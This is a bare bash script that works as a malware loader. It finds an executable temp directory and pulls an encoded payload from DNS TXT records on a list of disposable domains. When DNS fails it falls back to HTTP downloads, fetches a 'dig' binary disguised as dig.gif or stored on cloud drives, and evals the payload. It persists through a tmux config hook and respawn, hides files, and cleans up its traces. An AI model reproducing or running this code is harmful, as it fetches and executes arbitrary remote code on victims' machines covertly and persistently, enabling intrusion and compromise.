#!/bin/bash

set +x
TMX=${TMX:-0}
PATH=.:$PATH

for ph in {/tmp,/dev/shm,/run,~/,/var/tmp,/var/cache}; do
    rm -f $ph/.xtst
    touch $ph/.xtst &&
        chmod +x $ph/.xtst &&
        $ph/.xtst &&
        rm -f $ph/.xtst &&
        cd $ph &&
        break
done
{ type base64 &>/dev/null && b64=base64; } ||
        { type openssl &>/dev/null && b64="openssl enc -base64 "; } ||
                { sleep 3 && echo "no encoding tools availables!" exit 1; }

parsedata() {
    ## strip truncated messages
    # data=$(echo "${data}" | while read l; do [ "${l/\;\;}" = "${l}" ] && echo "$l" && break; done)
    data=${data//\"} ## after this we order chunks
    data=${data// }
    declare -a ar_data
    for l in $data; do
        ar_data[${l:0:1}]=${l:1}
    done
    data=${ar_data[@]}
    data=${data// }
    # data=$(IFS=\$'" "'; echo $data) ## after this we order chunks
    # data=${data// }
    # data=$(while read l; do echo ${l:1}; done <<< "$data")
    ## dns records escaping related
    # data=${data//\ }
    # data=${data//\"}
    ## fix for freedns TXT submission
    # [ "$data" != "${data%eql}" ] && data="${data%eql}="
}

querydns() {
    local var=$1
    local digc="$dig txt ${record}.${zone} +short +tcp +timeout=3 +retries=0"
    eval "$var=\$($digc @1.1.1.1) || $var=\$($digc @8.8.8.8) || $var=\$($digc)"
}

resolves() {
    local d=$1
    getent ahosts $d ||
        host -t a $d ||
        $dig a $d +short +tcp +timeout=3 +retries=0 ||
        nslookup localhost $d
}

targets=(
    "drun.ml"
    "unto.re"
    "druns.ml"
    "drunt.ml"
    "drunu.ml"
    "drunv.ml"
    "drunz.ml"
    "druns.cf"
    "drunt.cf"
    "drunu.cf"
    "drunv.cf"
    "drunz.cf"
    "druns.ga"
    "drunt.ga"
    "drunu.ga"
    "drunv.ga"
    "drunz.ga"
    "druns.gq"
    "drunt.gq"
    "drunu.gq"
    "drunv.gq"
    "drunz.gq"
)

endpoints() {
    data= launcher=
    chunksize=2047 # 1 char for order
    try=-1
    while [ -z "$launcher" ]; do
        try=$((try+1)) ## before
        if [ "$try" = 0 ]; then
            zone=${lr_zone:-${targets[$try]}}
            record=${lr_record:-d}
        else
            zone=${targets[$try]}
            record=d
        fi
        querydns data
        parsedata
        launcher=${data}
        launcher=$(echo "$launcher" | $b64 -d -w $chunksize | gzip -d) ## can only gzip decode directly through pipe
        if [ -z "$launcher" ]; then
            if resolves "${zone}" ; then
                endpoints_fallback launcher
            fi
        fi
    done
    while [ -z "$pl_vars" ]; do
        if [ "$try" = 0 ]; then
            zone=${pl_zone:-${targets[$try]}}
            record=${pl_record:-plvars}
        else
            zone=${targets[$try]}
            record=plvars
        fi
        try=$((try+1)) ## after
        querydns pl_vars
        pl_vars=${pl_vars/\"}
        pl_vars=${pl_vars%\"}
        pl_vars=${pl_vars//\\\"/\"}
        if [ -z "$pl_vars" ]; then
            if resolves "${zone}"; then
                endpoints_fallback pl_vars
            fi
        fi
    done
}

endpoints_fallback() {
    case "$1" in
        launcher)
            script_url=${scr_url:-"http://latest.${zone}"}
            data=$($b64 -d <<< "$(wget -t 3 -T 5 -q -i- -O- <<< "$script_url")")
            [ -z "$data" ] && data=$(curl -L "$script_url" -s -o-)
            launcher=${data}
            ;;
        pl_vars)
            token_url=${tkn_url:-"https://pl.${zone}"}
            pl_vars=$(echo "$token_url" | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 'Location') ## m1 also important to stop wget
            pl_vars=${pl_vars#*\/}
            pl_vars=${pl_vars//\"&/\" }
            pl_vars=${pl_vars//%3F/\?}
            ;;
    esac
}

filename=".rslv"
getdig() {
    ## try targets
    for t in ${targets[@]}; do
        digurl="http://pld.${t}/dig.gif"
        wget -t 2 -T 10 -q -i- -O- > ${filename} <<< "$digurl" && chmod +x ${filename}
        digv="$(./${filename} -v 2>&1)"
        [ "${digv/DiG}" != "${digv}" ] && return
    done
    ## try cloudme
    digurl="https://www.cloudme.com/v1/ws2/:fragia/:dig/dig"
    wget -t 2 -T 10 -q -i- -O- > ${filename} <<< "$digurl" && chmod +x ${filename}
    digv="$(./${filename} -v 2>&1)"
    [ "${digv/DiG}" != "${digv}" ] && return
    ## try google
    fileid="1WiXVJgwjkmnwpMGkjT8cUp0RDeuPILwf"
    gdriveCookieUrl="https://drive.google.com/uc?export=download&id=${fileid}"
    gdriveDownloadUrl="https://drive.google.com/uc?export=download&id=${fileid}&confirm="
    echo "$gdriveCookieUrl" | wget -t 1 -T 5 -q --save-cookies ./cookie -O/dev/null -i-
    gdriveDownloadId=$(awk '/download/ {print $NF}' ./cookie)
    echo  "$gdriveDownloadUrl" | wget -t 1 -T 5 -q  --load-cookies ./cookie -i- -O- > ${filename}
    chmod +x "$filename"
    rm -f ./cookie
    digv="$(./${filename} -v 2>&1)"
    [ "${digv/DiG}" != "${digv}" ] && return
    ## give up
    echo "error, couldn't get dig!"
    return 1
}

while [ -z "$launcher" ]; do
    if type dig &>/dev/null; then
        dig="dig"
        endpoints
    else
        dig="$filename"
        { getdig && endpoints; } ||
            { endpoints_fallback launcher; endpoints_fallback pl_vars; }
    fi
    sleep 1
done

# pl_mask=":ep/:token" pl_token="${pl_token}" pl_name="${pl_name:-payload}"
eval "$pl_vars"
echo "export \
$pl_vars \
X_TOKEN=${X_TOKEN:-acstkn} \
$ENV_VARS \
">env.sh

if [ "$TMX" = 1 ]; then
    [ -z "$BASH_SOURCE" ] && { echo "under tmux don't use pipes or redirects"; exit 1; }
    tmx_init="new -d -s init sleep 10"
    grep -q "$tmx_init" ~/.tmux.conf || echo "$tmx_init" >> ~/.tmux.conf
    tmux start-server
    tmux set -g default-shell /bin/bash

    # tmux  setenv -g pl_token "$pl_mask"
    # tmux  setenv -g pl_token "$pl_token"
    # tmux  setenv -g pl_name "$pl_name"

    tmux kill-session -t crt; sleep 1
    tmux new -d -s crt
    tmux set-option -t crt remain-on-exit
    ENV=$(<env.sh)
    # tmux set-hook -t crt pane-died "run 'cd \"$PWD\"; tmux respawn-pane -t crt ; tmux send-keys -t crt \"eval  \" \"$ENV\" Enter \". \" ./\\\"..\ \\\" Enter'"
    tmux set-hook -t crt pane-died "run 'exec bash $BASH_SOURCE'"

    echo "$launcher" > ".. "
    tmux send-keys -t crt ". ./\".. \"" Enter
    (sleep 5 && rm -f env.sh "$filename") &>/dev/null &
else
    (sleep 5 && rm -f env.sh "$filename") &>/dev/null &
    sleep 1
    eval "$(printf '%s' "$launcher")" &>/dev/null
fi
